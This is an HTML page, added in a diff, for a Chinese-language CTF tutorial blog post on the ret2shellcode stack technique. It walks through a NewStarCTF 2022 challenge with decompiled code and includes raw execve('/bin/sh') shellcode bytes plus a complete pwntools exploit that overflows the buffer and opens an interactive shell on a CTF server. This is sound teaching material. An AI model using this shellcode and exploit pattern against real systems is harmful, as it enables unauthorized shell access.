@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Ret2shellcode - C12en
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>C12EN</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>这次我们再来介绍一个栈的经典题型</p>
+<p>在我们先前遇到的题目中，都有着出题人为我们提供的后门函数，如果没有后门函数，我们又该如何自己构建shellcode呢？</p>
+<p>带着这个疑问，我们开始今天的学习</p>
+<h2 id="如何写入system（-bin-sh）？"><a href="#如何写入system（-bin-sh）？" class="headerlink" title="如何写入system（&#x2F;bin&#x2F;sh）？"></a>如何写入system（&#x2F;bin&#x2F;sh）？</h2><p>由于题目通常都会开启NX保护，所以我们要想在栈中写入字符串是不现实的打算</p>
+<p>我们好好想想，在内存块的五个分区中，还有哪个区块是可以为我们自由编辑的，这里我们想到了用来存储未初始化的全局变量区bss段</p>
+<p>那么如何写入呢？</p>
+<p>我们先前已经知道了，计算机读不懂高级语言，即system(&#x2F;bin&#x2F;sh)</p>
+<p>先前我们已经通过构造rop的方式用汇编语言指引执行流</p>
+<p>这次我们尝试用机器码来将shellcode注入到内存中</p>
+<p><strong>常用的shellcode：”\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05”</strong></p>
+<p>这个shellcode只有23个字节，当题目的输入字长给的不够多的时候可以使用这个</p>
+<p>当然还有第二种构造机器码的方式</p>
+<p><strong>shellcode &#x3D; asm(shellcraft.sh())</strong></p>
+<p>但是你很快就会发现，为什么自己在32位情况下可以使用，但是64位下就不行</p>
+<p>我们还需要在后面加上amd64才能使其输出64位的机器码</p>
+<p>当然我们也可以通过**context.arch &#x3D; “amd64”**来使环境转化为64位，于是我们在接下来即使不用amd64也能输出64位机器码</p>
+<h2 id="例题解析"><a href="#例题解析" class="headerlink" title="例题解析"></a>例题解析</h2><p>这里以NewStarCTF 2022新生赛公开赛 的ret2shellcode作为例题讲解</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022258964.png" alt="a"></p>
+<p>老规矩看一下保护机制，NX开了，看来不能在栈上写入</p>
+<p>ida看一下具体情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  buf = mmap((<span class="type">void</span> *)<span class="number">0x233000</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello my friend.Any gift for me?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Anything else?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok.See you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>出现了个mmap函数，用来干什么的？</p>
+<p>可以简单理解为 开辟一块空间存放我们输入的值 其地址为第一个参数addr(0x233000)</p>
+<p>那么我们的目的就是将shellcode写入这块空间，然后在接下来的栈溢出中控制程序执行流到shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25533</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello my friend.Any gift for me?&quot;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Anything else?&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">56</span>)+p64(<span class="number">0x233000</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其实本质上还是栈溢出控制程序执行流到后门函数，只不过这个后门函数是我们自己存入到程序中的，还是挺好理解的</p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="C"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>C12en</div>
+      <div>2022-09-21</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/stack/">stack</a>
+
+      
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
